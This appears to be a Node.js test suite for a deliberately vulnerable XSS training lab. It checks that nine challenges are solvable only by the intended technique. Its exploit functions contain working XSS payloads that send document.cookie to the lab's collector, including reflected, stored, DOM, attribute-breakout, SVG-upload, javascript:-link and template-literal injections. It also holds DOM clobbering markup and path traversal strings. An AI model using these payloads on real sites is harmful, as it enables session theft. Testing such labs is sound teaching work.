'use strict';
// XSS module: every challenge must be solvable by the documented technique and
// must NOT be solvable by the obvious shortcut. No browser is available, so the
// tests play the browser: they fetch the page, run its live inline scripts (and
// the injected payload) in a vm sandbox with a stubbed DOM, then deliver the
// beacon the script produced to the real collector.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

const NAMES = {
  reflected: 'Reflected XSS',
  stored: 'Stored XSS',
  dom: 'DOM-based XSS',
  'xss-attr-breakout': 'XSS via Attribute Breakout',
  'xss-js-context': 'XSS in a JavaScript String',
  'xss-svg-upload': 'Stored XSS via SVG Upload',
  'xss-markdown': 'XSS via Naive Markdown Links',
  'xss-dom-clobber': 'DOM Clobbering to Admin',
  'xss-backtick': 'XSS in a Template Literal',
};
const IDS = Object.keys(NAMES);

// ---------------------------------------------------------------- browser sim
const TAG_RE = /<(\/?)([a-zA-Z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

// Inline scripts a browser would really execute: attribute values, comments and
// textarea text are never mistaken for script tags.
function liveScripts(html) {
  const src = html.replace(/<!--[\s\S]*?-->/g, '').replace(/<textarea\b[^>]*>[\s\S]*?<\/textarea>/gi, '');
  const out = [];
  TAG_RE.lastIndex = 0;
  let m;
  while ((m = TAG_RE.exec(src))) {
    if (m[1] === '/' || m[2].toLowerCase() !== 'script') continue;
    const i = src.slice(TAG_RE.lastIndex).search(/<\/script/i);
    const end = i >= 0 ? TAG_RE.lastIndex + i : src.length;
    if (!/\bsrc\s*=/.test(m[3])) out.push(src.slice(TAG_RE.lastIndex, end));
    TAG_RE.lastIndex = end;
  }
  return out;
}

function decodeEntities(s) {
  return s
    .replace(/&#(\d+);/g, (_, d) => String.fromCharCode(Number(d)))
    .replace(/&#x([0-9a-f]+);/gi, (_, h) => String.fromCharCode(parseInt(h, 16)))
    .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&amp;/g, '&');
}

function makeBrowser(cookie, { hash = '', search = '' } = {}) {
  const calls = [];
  const errors = [];
  const els = {};
  const el = (id) => (els[id] = els[id] || {
    style: {}, textContent: '', innerHTML: '', hidden: true,
    getAttribute: () => '/xss/claim-status?v=none',
    querySelector: () => ({ style: {} }),
  });
  const ctx = {
    document: { cookie, getElementById: el },
    location: { hash, search },
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({ captured: false }) }); },
    setInterval: () => 0,
    alert: () => { calls.push('ALERT'); },
    URLSearchParams,
    decodeURIComponent,
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  const run = (code) => {
    try { vm.runInContext(code, ctx, { timeout: 1000 }); } catch (e) { errors.push(e.message); }
  };
  return {
    el, calls, errors, run,
    runPage: (html) => liveScripts(html).forEach(run),
    beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
  };
}

// Several script copies may beacon with the same single-use token (for example a
// payload reflected twice); the first one wins, so report the first success.
async function deliver(c, browser) {
  let last = null;
  for (const url of browser.beacons()) {
    const r = await c.get(url);
    if (r.status === 200) return r;
    last = r;
  }
  return last;
}

// ------------------------------------------------------------- page checks
function stripClaimBox(html) {
  // The shared claimBox() helper ships inline styles; it is covered by a shared request.
  return html.replace(/<div class="card claim-box"[\s\S]*?<\/script>/, '');
}

function assertStyled(html, label) {
  const body = stripClaimBox(html);
  assert.ok(!/\sstyle\s*=/i.test(body), `${label}: inline style attribute`);
  assert.ok(!/<style[\s>]/i.test(body), `${label}: <style> block`);
  for (const tag of body.match(/<input\b[^>]*>/gi) || []) assert.match(tag, /class="clay-input"/, `${label}: ${tag}`);
  for (const tag of body.match(/<textarea\b[^>]*>/gi) || []) assert.match(tag, /class="clay-input"/, `${label}: ${tag}`);
  for (const tag of body.match(/<select\b[^>]*>/gi) || []) assert.match(tag, /class="clay-select"/, `${label}: ${tag}`);
  for (const tag of body.match(/<button\b[^>]*>/gi) || []) assert.match(tag, /class="(clay-btn|copy-btn|btn)\b/, `${label}: ${tag}`);
  for (const tag of body.match(/<table\b[^>]*>/gi) || []) assert.match(tag, /class="tbl"/, `${label}: bare table`);
  for (const tag of body.match(/<th\b[^>]*>/gi) || []) assert.match(tag, /scope=/, `${label}: th without scope`);
}

async function assertLinks(c, html, label) {
  const hrefs = new Set([...html.matchAll(/(?:href|action)="([^"]+)"/g)]
    .map((m) => decodeEntities(m[1])).filter((h) => h.startsWith('/') && !h.startsWith('//')));
  for (const h of hrefs) {
    const path = h.split('#')[0];
    if (!path) continue;
    const r = await c.get(path);
    assert.notEqual(r.status, 404, `${label}: ${h} is a dead link`);
  }
}

// ---------------------------------------------------------------- payloads
const beaconJs = (v, token = 'window.__px') => `fetch('/xss/collect?c='+document.cookie+'&v=${v}&n='+${token})`;
const q = encodeURIComponent;

test('xss module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'xss', id);
  const fresh = () => client(srv.base);
  const heldFlags = async (c) => (await capturedSet(c)).filter((s) => s.startsWith('xss:'));
  const has = async (c, id) => (await capturedSet(c)).includes(`xss:${NAMES[id]}`);
  const noFlag = (res, label) => assert.equal((res.text.match(FLAG_RE) || []).length, 0, `${label}: flag leaked`);

  // Each exploit plays the browser end to end and returns the collector response.
  const exploits = {
    async reflected(c) {
      const page = await c.get('/xss/search?q=' + q(`<script>${beaconJs('reflected')}</script>`));
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
    async stored(c) {
      await c.post('/xss/guestbook', { author: 'mallory', body: `<script>${beaconJs('stored')}</script>` });
      const page = await c.get('/xss/guestbook');
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
    async dom(c) {
      const page = await c.get('/xss/dom');
      const hash = `#<img src=x onerror="${beaconJs('dom')}">`;
      const b = makeBrowser(c.cookie(), { hash });
      b.runPage(page.text);
      const sink = b.el('out').innerHTML;
      const handler = sink.match(/onerror\s*=\s*"([^"]*)"/);
      assert.ok(handler, 'payload did not reach innerHTML');
      b.run(decodeEntities(handler[1]));
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
    async 'xss-attr-breakout'(c) {
      const page = await c.get('/xss/attr?n=' + q(`"><script>${beaconJs('xss-attr-breakout')}</script>`));
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
    async 'xss-js-context'(c) {
      const page = await c.get('/xss/jsctx?q=' + q(`';${beaconJs('xss-js-context')};//`));
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, [], 'payload must keep the page script syntactically valid');
      return deliver(c, b);
    },
    async 'xss-svg-upload'(c) {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[${beaconJs('xss-svg-upload', "new URLSearchParams(location.search).get('n')")}]]></script></svg>`;
      const up = await c.post('/xss/svg', { name: 'evil', svg });
      assert.equal(up.status, 302);
      const loc = up.headers.get('location');
      const file = await c.get(loc);
      assert.match(file.headers.get('content-type'), /image\/svg\+xml/);
      const search = loc.slice(loc.indexOf('?'));
      const b = makeBrowser(c.cookie(), { search });
      const script = file.text.match(/<script>(?:<!\[CDATA\[)?([\s\S]*?)(?:\]\]>)?<\/script>/);
      assert.ok(script, 'uploaded SVG lost its script');
      b.run(script[1]);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
    async 'xss-markdown'(c) {
      const md = `[click](javascript:${beaconJs('xss-markdown')})`;
      const page = await c.post('/xss/markdown', { md });
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      const href = page.text.match(/<a href="(javascript:[^"]*)">click<\/a>/);
      assert.ok(href, 'javascript: link was not rendered');
      b.run(decodeEntities(href[1]).slice('javascript:'.length));
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
    async 'xss-dom-clobber'(c) {
      await c.post('/xss/clobber', { html: '<form id="settings"><input name="isAdmin" value="1"></form>' });
      return c.get('/xss/clobber-admin');
    },
    async 'xss-backtick'(c) {
      const page = await c.get('/xss/backtick?m=' + q('${' + beaconJs('xss-backtick') + '}'));
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
  };

  // Pages whose normal view must be clean (no flag, styled, links resolve).
  const PAGES = ['/xss', '/xss/search', '/xss/guestbook', '/xss/dom', '/xss/attr', '/xss/jsctx', '/xss/svg',
    '/xss/markdown', '/xss/clobber', '/xss/backtick', '/xss/clobber-admin'];

  await t.test('module index renders: nine cards, a way in to every challenge, no em dash, no flags', async () => {
    const c = fresh();
    const { status, text } = await c.get('/xss');
    assert.equal(status, 200);
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 9);
    for (const id of IDS) assert.ok(text.includes(`id="${id}"`), `card for ${id}`);
    for (const link of ['/xss/search', '/xss/guestbook', '/xss/dom', '/xss/attr', '/xss/jsctx', '/xss/svg', '/xss/markdown', '/xss/clobber', '/xss/backtick']) {
      assert.ok(text.includes(`href="${link}"`), `index links to ${link}`);
    }
    assert.equal((text.match(/Hint \d: /g) || []).length, 27, 'three hint levels per challenge');
    assert.ok(!text.includes('\u2014'), 'em dash');
  });

  await t.test('every page: 200, styled controls, no em dash, no flag, no dead links, claim box where a beacon applies', async () => {
    const c = fresh();
    for (const path of PAGES) {
      const r = await c.get(path);
      assert.equal(r.status, 200, path);
      assert.ok(!r.text.includes('\u2014'), `${path}: em dash`);
      noFlag(r, path);
      assertStyled(r.text, path);
      await assertLinks(c, r.text, path);
      if (path !== '/xss' && path !== '/xss/clobber' && path !== '/xss/clobber-admin') {
        assert.ok(r.text.includes('How to claim this flag'), `${path}: claim box`);
        assert.match(r.text, /data-status-url="\/xss\/claim-status\?v=[a-z-]+"/, `${path}: status url`);
        assert.match(r.text, /window\.__px="[0-9a-f]{32}"/, `${path}: page token`);
      }
    }
    // Pages that only exist after an action.
    const post = await c.post('/xss/markdown', { md: 'hello **world** [docs](https://example.com)' });
    assert.equal(post.status, 200);
    assertStyled(post.text, 'markdown result');
    noFlag(post, 'markdown result');
    const bad = await c.post('/xss/guestbook', { author: '', body: '' });
    assert.equal(bad.status, 400);
    assertStyled(bad.text, 'guestbook error');
    const badSvg = await c.post('/xss/svg', { name: 'x', svg: 'not svg' });
    assert.equal(badSvg.status, 400);
    assertStyled(badSvg.text, 'svg error');
    await c.post('/xss/svg', { name: 'plain', svg: '<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>' });
    const list = await c.get('/xss/svg');
    assertStyled(list.text, 'svg list');
    assert.ok(list.text.includes('<table class="tbl">'));
    await assertLinks(c, list.text, 'svg list');
    assert.deepEqual(await heldFlags(c), []);
  });

  await t.test('collector: bare, empty, wrong-token and wrong-vuln beacons are rejected and consume nothing', async () => {
    const c = fresh();
    const bare = await c.get('/xss/collect?c=x&v=reflected');
    assert.equal(bare.status, 400);
    noFlag(bare, 'bare');
    assert.equal((await c.get('/xss/collect?c=x&v=reflected&n=deadbeef')).status, 400);
    assert.equal((await c.get('/xss/collect?v=reflected')).status, 400);
    assert.equal((await c.get('/xss/collect?c=x&v=nope&n=1')).status, 400);
    assert.deepEqual(await c.get('/xss/claim-status?v=nope').then((r) => r.status), 400);
    // A real token, but for another challenge or with no data, earns nothing.
    const page = await c.get('/xss/search');
    const tok = page.text.match(/window\.__px="([0-9a-f]{32})"/)[1];
    assert.equal((await c.get(`/xss/collect?c=x&v=stored&n=${tok}`)).status, 400, 'token is bound to its challenge');
    assert.equal((await c.get(`/xss/collect?c=&v=reflected&n=${tok}`)).status, 400, 'empty data');
    assert.equal((await c.get(`/xss/collect?v=reflected&n=${tok}`)).status, 400, 'missing data');
    // Another student's token is useless in this session.
    const other = fresh();
    const otherTok = (await other.get('/xss/search')).text.match(/window\.__px="([0-9a-f]{32})"/)[1];
    assert.equal((await c.get(`/xss/collect?c=x&v=reflected&n=${otherTok}`)).status, 400, 'foreign token');
    // None of those consumed the real token: the genuine beacon still works.
    const ok = await c.get(`/xss/collect?c=x&v=reflected&n=${tok}`);
    assert.equal(ok.status, 200);
    assert.ok(ok.text.includes(flagOf('reflected')));
    assert.ok(ok.text.includes('Encode all untrusted data'), 'fix panel matches the captured challenge');
    // Replaying the same beacon does not work: tokens are single-use.
    assert.equal((await c.get(`/xss/collect?c=x&v=reflected&n=${tok}`)).status, 400);
    assert.equal((await c.get('/xss/claim-status?v=reflected')).body.captured, true);
    assert.equal((await c.get('/xss/claim-status?v=stored')).body.captured, false);
    assert.equal((await c.get('/xss/claim-status?v=reflected')).text.match(FLAG_RE), null);
    assert.equal((await c.get('/xss/collect?c=x&v=xss-dom-clobber&n=anything')).status, 400, 'clobber is not beacon-awarded');
  });

  await t.test('reflected: script in the search term earns the flag; alert, plain text and a page-less beacon do not', async () => {
    const c = fresh();
    const plain = await c.get('/xss/search?q=lamp');
    assert.ok(plain.text.includes('Walnut desk lamp'), 'real search results');
    const alertPage = await c.get('/xss/search?q=' + q('<script>alert(1)</script>'));
    const b = makeBrowser(c.cookie());
    b.runPage(alertPage.text);
    assert.deepEqual(b.calls.filter((u) => u.startsWith('/xss/collect')), []);
    assert.ok(b.calls.includes('ALERT'), 'the XSS fires but proves nothing to the server');
    assert.equal(await has(c, 'reflected'), false);
    assert.deepEqual(await heldFlags(c), []);
    const hit = await exploits.reflected(c);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('reflected')));
    assert.ok(await has(c, 'reflected'));
    await exploits.reflected(c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:Reflected XSS').length, 1, 'no double count');
  });

  await t.test('stored: benign posts earn nothing, the stored payload fires on reload', async () => {
    const c = fresh();
    const bad = await c.get('/xss/collect?c=session&v=stored');
    assert.equal(bad.status, 400);
    const posted = await c.post('/xss/guestbook', { author: 'sam', body: 'Great coffee, lovely staff.' });
    assert.equal(posted.status, 302);
    const page = await c.get('/xss/guestbook');
    assert.ok(page.text.includes('Great coffee, lovely staff.'));
    const b = makeBrowser(c.cookie());
    b.runPage(page.text);
    assert.deepEqual(b.beacons(), []);
    assert.equal(await has(c, 'stored'), false);
    const hit = await exploits.stored(c);
    assert.ok(hit.text.includes(flagOf('stored')));
    assert.ok(await has(c, 'stored'));
    await exploits.stored(c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:Stored XSS').length, 1);
  });

  await t.test('dom: the fragment payload fires in the browser; the server never sees it; script tags and plain text do not', async () => {
    const c = fresh();
    const page = await c.get('/xss/dom');
    const asScript = makeBrowser(c.cookie(), { hash: `#<script>${beaconJs('dom')}</script>` });
    asScript.runPage(page.text);
    assert.equal(asScript.el('out').innerHTML.includes('<script>'), true);
    assert.deepEqual(asScript.beacons(), [], 'script tags assigned through innerHTML never run');
    const alertOnly = makeBrowser(c.cookie(), { hash: '#<img src=x onerror=alert(1)>' });
    alertOnly.runPage(page.text);
    alertOnly.run('alert(1)');
    assert.deepEqual(alertOnly.beacons(), []);
    assert.equal(await has(c, 'dom'), false);
    // Percent-encoded fragments (what some browsers store) are decoded by the page.
    const enc = makeBrowser(c.cookie(), { hash: '#' + q(`<img src=x onerror="${beaconJs('dom')}">`) });
    enc.runPage(page.text);
    assert.ok(/onerror/.test(enc.el('out').innerHTML));
    const hit = await exploits.dom(c);
    assert.ok(hit.text.includes(flagOf('dom')));
    assert.ok(await has(c, 'dom'));
    await exploits.dom(c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:DOM-based XSS').length, 1);
  });

  await t.test('xss-attr-breakout: only a quote breakout runs; an unquoted tag stays inert inside the attribute', async () => {
    const c = fresh();
    const inert = await c.get('/xss/attr?n=' + q(`<script>${beaconJs('xss-attr-breakout')}</script>`));
    assert.ok(inert.text.includes('id="preview-nick" value="<script>'), 'payload sits inside the attribute');
    const b = makeBrowser(c.cookie());
    b.runPage(inert.text);
    assert.deepEqual(b.beacons(), []);
    const plain = makeBrowser(c.cookie());
    plain.runPage((await c.get('/xss/attr?n=nightowl')).text);
    assert.deepEqual(plain.beacons(), []);
    assert.equal(await has(c, 'xss-attr-breakout'), false);
    const hit = await exploits['xss-attr-breakout'](c);
    assert.ok(hit.text.includes(flagOf('xss-attr-breakout')));
    await exploits['xss-attr-breakout'](c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:XSS via Attribute Breakout').length, 1);
  });

  await t.test('xss-js-context: the quote breakout runs and keeps the script valid; plain text and a half-payload do not', async () => {
    const c = fresh();
    const plain = makeBrowser(c.cookie());
    plain.runPage((await c.get('/xss/jsctx?q=Alex')).text);
    assert.deepEqual(plain.errors, []);
    assert.equal(plain.el('greet').textContent, 'Hello, Alex!');
    // Without the closing // the leftover quote is a syntax error: no beacon runs.
    const broken = makeBrowser(c.cookie());
    broken.runPage((await c.get('/xss/jsctx?q=' + q(`';${beaconJs('xss-js-context')};`))).text);
    assert.ok(broken.errors.length > 0);
    assert.deepEqual(broken.beacons(), []);
    assert.equal(await has(c, 'xss-js-context'), false);
    const hit = await exploits['xss-js-context'](c);
    assert.ok(hit.text.includes(flagOf('xss-js-context')));
    await exploits['xss-js-context'](c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:XSS in a JavaScript String').length, 1);
    // Closing the script element is a second real route into the same sink.
    const alt = fresh();
    const page = await alt.get('/xss/jsctx?q=' + q(`</script><script>${beaconJs('xss-js-context')}</script>`));
    const b = makeBrowser(alt.cookie());
    b.runPage(page.text);
    assert.equal(b.beacons().length, 1);
    assert.ok((await deliver(alt, b)).text.includes(flagOf('xss-js-context')));
  });

  await t.test('xss-backtick: ${} runs inside the literal; backticks-free text and an un-wrapped call do not', async () => {
    const c = fresh();
    const plain = makeBrowser(c.cookie());
    plain.runPage((await c.get('/xss/backtick?m=hello')).text);
    assert.equal(plain.el('status').textContent, 'hello');
    const noWrap = makeBrowser(c.cookie());
    noWrap.runPage((await c.get('/xss/backtick?m=' + q(beaconJs('xss-backtick')))).text);
    assert.deepEqual(noWrap.beacons(), [], 'a bare call is just text inside the literal');
    assert.equal(await has(c, 'xss-backtick'), false);
    const hit = await exploits['xss-backtick'](c);
    assert.ok(hit.text.includes(flagOf('xss-backtick')));
    await exploits['xss-backtick'](c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:XSS in a Template Literal').length, 1);
  });

  await t.test('xss-svg-upload: a script SVG opened with its token earns the flag; plain SVGs, no token and non-SVG do not', async () => {
    const c = fresh();
    const svgOf = (extra) => `<svg xmlns="http://www.w3.org/2000/svg">${extra}</svg>`;
    const plainUp = await c.post('/xss/svg', { name: 'circle', svg: svgOf('<circle r="4"/>') });
    assert.equal(plainUp.status, 302);
    const plainFile = await c.get(plainUp.headers.get('location'));
    assert.equal(plainFile.status, 200);
    assert.deepEqual(liveScripts(plainFile.text), []);
    assert.equal((await c.post('/xss/svg', { name: 'x', svg: 'just text' })).status, 400);
    assert.equal(await has(c, 'xss-svg-upload'), false);

    // A script that cannot read the token (file opened without ?n=) is rejected.
    const up = await c.post('/xss/svg', {
      name: 'noconfig',
      svg: svgOf(`<script><![CDATA[${beaconJs('xss-svg-upload', "new URLSearchParams(location.search).get('n')")}]]></script>`),
    });
    const file = up.headers.get('location').split('?')[0];
    const body = (await c.get(file)).text;
    const b = makeBrowser(c.cookie(), { search: '' });
    b.run(body.match(/CDATA\[([\s\S]*?)\]\]>/)[1]);
    assert.equal((await deliver(c, b)).status, 400, 'no token in the file URL');
    assert.equal(await has(c, 'xss-svg-upload'), false);

    // A documented-style payload with a bare & is not well-formed XML, so a browser would refuse to run it.
    const withoutCdata = body.replace('<![CDATA[', '').replace(']]>', '');
    assert.ok(/&(?!(amp|lt|gt|quot|apos|#\d+);)/.test(withoutCdata.replace(/<!\[CDATA\[[\s\S]*?\]\]>/g, '')),
      'sanity: the bare-& form is what the XML check catches');
    assert.ok(!/&(?!(amp|lt|gt|quot|apos|#\d+);)/.test(body.replace(/<!\[CDATA\[[\s\S]*?\]\]>/g, '')), 'CDATA form is well-formed');

    const hit = await exploits['xss-svg-upload'](c);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('xss-svg-upload')));
    await exploits['xss-svg-upload'](c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:Stored XSS via SVG Upload').length, 1);

    // Traversal attempts must be refused (raw request: fetch would normalize the path first).
    const raw = (p) => new Promise((resolve, reject) => {
      const u = new URL(srv.base);
      require('node:http').get({ host: u.hostname, port: u.port, path: p }, (res) => { res.resume(); resolve(res.statusCode); }).on('error', reject);
    });
    assert.equal(await raw('/xss/uploads/..%2f..%2fpublic%2fstyle.css'), 400);
    assert.equal(await raw('/xss/uploads/..%2fevil.svg'), 400);
    assert.equal((await c.get('/xss/uploads/missing.svg')).status, 404);
  });

  await t.test('xss-markdown: a javascript: link (also entity-encoded) beacons; http links and alert do not', async () => {
    const c = fresh();
    const safe = await c.post('/xss/markdown', { md: '[docs](https://example.com/guide)' });
    assert.ok(safe.text.includes('<a href="https://example.com/guide">docs</a>'));
    const b0 = makeBrowser(c.cookie());
    b0.runPage(safe.text);
    assert.deepEqual(b0.beacons(), []);
    const alertLink = await c.post('/xss/markdown', { md: '[x](javascript:alert(1))' });
    const href = alertLink.text.match(/<a href="(javascript:[^"]*)">x<\/a>/);
    assert.ok(href, 'balanced parentheses survive the renderer');
    const b1 = makeBrowser(c.cookie());
    b1.runPage(alertLink.text);
    b1.run(decodeEntities(href[1]).slice(11));
    assert.deepEqual(b1.beacons(), []);
    assert.equal(await has(c, 'xss-markdown'), false);
    // Rendering the link without clicking it proves nothing either.
    const unclicked = await c.post('/xss/markdown', { md: `[x](javascript:${beaconJs('xss-markdown')})` });
    const b2 = makeBrowser(c.cookie());
    b2.runPage(unclicked.text);
    assert.deepEqual(b2.beacons(), [], 'the link must be clicked');
    assert.equal(await has(c, 'xss-markdown'), false);

    const hit = await exploits['xss-markdown'](c);
    assert.ok(hit.text.includes(flagOf('xss-markdown')));
    await exploits['xss-markdown'](c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:XSS via Naive Markdown Links').length, 1);

    // The entity-encoded shape from the written solutions also works.
    const alt = fresh();
    const entity = `[x](javascript:fetch&#40;'/xss/collect?c='+document.cookie+'&v=xss-markdown&n='+window.__px&#41;)`;
    const page = await alt.post('/xss/markdown', { md: entity });
    const b3 = makeBrowser(alt.cookie());
    b3.runPage(page.text);
    b3.run(decodeEntities(page.text.match(/<a href="(javascript:[^"]*)">x<\/a>/)[1]).slice(11));
    assert.equal(b3.errors.length, 0);
    assert.ok((await deliver(alt, b3)).text.includes(flagOf('xss-markdown')));
  });

  await t.test('xss-dom-clobber: only real clobbering markup unlocks the panel, per session', async () => {
    const c = fresh();
    const denied = await c.get('/xss/clobber-admin');
    assert.ok(denied.text.includes('Access denied'));
    noFlag(denied, 'fresh session');

    const fakes = {
      comment: '<!-- <form id="settings"><input name="isAdmin"></form> -->',
      lookalike: '<form data-id="settings"><input data-name="isAdmin"></form>',
      attrText: '<form title="id=settings"><input title="name=isAdmin"></form>',
      wrongCase: '<form id="settings"><input name="isadmin"></form>',
      outsideForm: '<form id="settings"></form><input name="isAdmin">',
      otherForm: '<form id="profile"><input name="isAdmin"></form>',
      textarea: '<textarea><form id="settings"><input name="isAdmin"></form></textarea>',
      script: '<script>window.settings={isAdmin:1}</script>',
      onlyForm: '<form id="settings"></form>',
      onlyInput: '<input name="isAdmin" value="1">',
    };
    for (const [label, html] of Object.entries(fakes)) {
      await c.post('/xss/clobber', { html });
      const r = await c.get('/xss/clobber-admin');
      assert.ok(r.text.includes('Access denied'), `${label} must not unlock`);
      noFlag(r, label);
    }
    assert.equal(await has(c, 'xss-dom-clobber'), false);

    // The saved markup is shown raw but scripts are stripped.
    await c.post('/xss/clobber', { html: '<b>hi</b><script>window.settings={isAdmin:1}</script>' });
    const view = await c.get('/xss/clobber');
    assert.ok(view.text.includes('<b>hi</b>'));
    assert.ok(!/id="custom">[\s\S]*<script>window\.settings=/.test(view.text), 'scripts are stripped from the saved HTML');

    const hit = await exploits['xss-dom-clobber'](c);
    assert.ok(hit.text.includes(flagOf('xss-dom-clobber')));
    assert.ok(hit.text.includes('Do not let attacker markup create named elements'));
    assert.ok(await has(c, 'xss-dom-clobber'));
    await exploits['xss-dom-clobber'](c);
    assert.equal((await heldFlags(c)).filter((s) => s === 'xss:DOM Clobbering to Admin').length, 1);

    // A different student does not inherit the solved state.
    const other = fresh();
    const otherView = await other.get('/xss/clobber-admin');
    assert.ok(otherView.text.includes('Access denied'));
    assert.equal(await has(other, 'xss-dom-clobber'), false);

    // Other real clobbering shapes: tied control and anchor pair.
    for (const html of ['<input form="settings" name="isAdmin"><form id="settings"></form>', '<a id="settings"></a><a id="settings" name="isAdmin"></a>', "<form id='settings' class=x><img name=isAdmin></form>"]) {
      const s = fresh();
      await s.post('/xss/clobber', { html });
      assert.ok((await s.get('/xss/clobber-admin')).text.includes(flagOf('xss-dom-clobber')), html);
    }
  });

  await t.test('one student session captures all nine once each', async () => {
    const c = fresh();
    for (const id of IDS) {
      const r = await exploits[id](c);
      assert.equal(r.status, 200, id);
      assert.ok(r.text.includes(flagOf(id)), id);
    }
    for (const id of IDS) await exploits[id](c);
    const got = await heldFlags(c);
    assert.equal(got.length, 9);
    assert.equal(new Set(got).size, 9);
    for (const id of IDS) assert.ok(got.includes(`xss:${NAMES[id]}`), id);
  });
});
